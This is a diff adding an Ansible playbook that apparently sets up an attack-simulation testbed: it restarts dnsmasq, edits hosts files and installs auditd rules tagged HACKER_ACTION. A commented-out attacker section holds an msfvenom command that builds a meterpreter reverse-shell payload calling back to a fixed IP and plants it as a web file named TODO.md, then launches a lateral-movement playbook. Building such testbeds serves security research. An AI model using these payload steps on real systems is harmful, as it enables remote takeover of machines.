@@ -1,0 +1,123 @@
+- name: Retstart dnsmasq on inetdns
+  hosts: inetdns
+  become: true
+  tasks:
+  - name: stop dnsmasq
+    ansible.builtin.service:
+      name: dnsmasq
+      state: stopped
+    tags:
+      - playbooks
+
+  - name: start dnsmasq
+    ansible.builtin.service:
+      name: dnsmasq
+      state: started
+    tags:
+      - playbooks
+
+- name: Prepare target
+  hosts: target
+  become: true
+  tasks:
+    - name: Ensure 127.0.0.1 is present in /etc/hosts
+      ansible.builtin.lineinfile:
+        path: "/etc/hosts"
+        line: "127.0.0.1\ttarget"
+        state: present
+    - name: audit d rules
+      ansible.builtin.lineinfile:
+        path: "/etc/audit/rules.d/audit.rules"
+        line: "-a always,exit -S all -F euid=0 -F perm=x -F key=HACKER_ACTION"
+        state: present
+      notify: Restart auditd service
+  handlers:
+    - name: Restart auditd service
+      ansible.builtin.service:
+        name: auditd
+        state: restarted
+
+- name: Prepare target2
+  hosts: target2
+  become: true
+  tasks:
+    - name: Ensure 127.0.0.1 is present in /etc/hosts
+      ansible.builtin.lineinfile:
+        path: "/etc/hosts"
+        line: "127.0.0.1\ttarget2"
+        state: present
+    - name: audit d rules
+      ansible.builtin.lineinfile:
+        path: "/etc/audit/rules.d/audit.rules"
+        line: "-a always,exit -S all -F euid=0 -F perm=x -F key=HACKER_ACTION"
+        state: present
+      notify: Restart auditd service
+  handlers:
+    - name: Restart auditd service
+      ansible.builtin.service:
+        name: auditd
+        state: restarted
+
+# - name: Install Attacker Host
+#   hosts: attacker
+#   become: true
+#   vars:
+#     attacker_user: aecid
+#     attacker_ip: 192.42.1.174
+#     delay_before_attack: 300
+#   tasks:
+#     - name: Ensure 127.0.0.1 is present in /etc/hosts
+#       ansible.builtin.lineinfile:
+#         path: "/etc/hosts"
+#         line: "127.0.0.1\tattacker"
+#         state: present
+#     - name: get user home directory
+#       ansible.builtin.shell: >
+#              getent passwd {{ attacker_user }}  | awk -F: '{ print $6 }'
+#       changed_when: false
+#       register: user_home
+#       tags:
+#         - playbooks
+
+    # - name: Create file for privilegde escalation
+    #   ansible.builtin.shell:
+    #           cmd: msfvenom -p cmd/unix/python/meterpreter/reverse_tcp LHOST=192.42.1.174 --platform x64 > /var/www/html/TODO.md
+    #           creates: /var/www/html/TODO.md
+
+    # - name: Ensure delay before commands
+    #   ansible.builtin.replace:
+    #     path: /etc/attackmate.yml
+    #     regexp: 'command_delay: 0'
+    #     replace: 'command_delay: 15'
+    #     backup: yes
+    #   become: true
+    #   tags:
+    #     - playbooks
+
+
+    # - name: Copy playbooks
+    #   become: True
+    #   become_user: "{{attacker_user}}"
+    #   ansible.builtin.template:
+    #       src: "{{ item }}.j2"
+    #       dest: "{{user_home.stdout}}/{{ item }}.yml"
+    #       mode: '0755'
+    #   loop:
+    #     #  - priviledge_escalation
+    #     #  - tcpdump
+    #       - lateral_movement
+    #   tags:
+
+    #      - playbooks
+
+    # - name: "Run Caldera Playbook"
+    #   become: True
+    #   become_user: "{{attacker_user}}"
+    #   ansible.builtin.shell:
+    #       cmd: "sleep {{delay_before_attack}} && /usr/local/bin/attackmate-tmux lateral_movement.yml --json"
+    #       chdir: "{{user_home.stdout}}"
+    #   tags:
+    #      - caldera
+    #      - metasploit
+    #      - attackmate
+    #      - exploit
